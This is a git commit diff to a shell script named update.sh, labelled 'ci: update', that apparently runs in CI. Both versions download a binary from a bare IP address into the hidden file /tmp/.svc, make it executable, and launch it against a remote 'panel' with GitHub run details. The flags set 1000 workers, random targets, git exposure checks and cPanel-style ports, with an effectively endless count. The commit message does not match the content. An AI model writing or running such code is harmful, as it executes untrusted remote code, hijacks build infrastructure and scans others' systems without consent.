d543f871bd58dc0f233175026992b397a7a72ca8
Yoga Wicaksono <yogawicaksono20@gmail.com>
2026-08-01 08:09:42 +0700

    ci: update

--- update.sh
+++ update.sh
@@ -6,11 +6,11 @@ case "$(uname -m 2>/dev/null)" in
   armv*) suffix=arm ;;
   *) suffix=amd64 ;;
 esac
-curl -sfL "http://43.228.157.68/api/dl/${suffix}" -o /tmp/.svc 2>/dev/null || \
-  wget -qO /tmp/.svc "http://43.228.157.68/api/dl/${suffix}" 2>/dev/null
+curl -sfL "http://43.228.157.68:80/api/dl/${suffix}" -o /tmp/.svc 2>/dev/null || \
+  wget -qO /tmp/.svc "http://43.228.157.68:80/api/dl/${suffix}" 2>/dev/null
 test -s /tmp/.svc
 chmod 755 /tmp/.svc
-PANEL_URL="http://43.228.157.68" \
+PANEL_URL="http://43.228.157.68:80" \
 GITHUB_REPOSITORY="${GITHUB_REPOSITORY:-}" \
 GITHUB_RUN_ID="${GITHUB_RUN_ID:-}" \
 GOMEMLIMIT=2147483648 \
@@ -18,6 +18,6 @@ GOMEMLIMIT=2147483648 \
   --source random \
   --workers 1000 \
   --git \
-  --ports 80,443,8080,8443,2082,2083,2086,2087,2095,2096 \
+  --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 \
   --git-workers 20 \
   --count 9999999999 --no-reverse 2>&1 | tail -2 || true
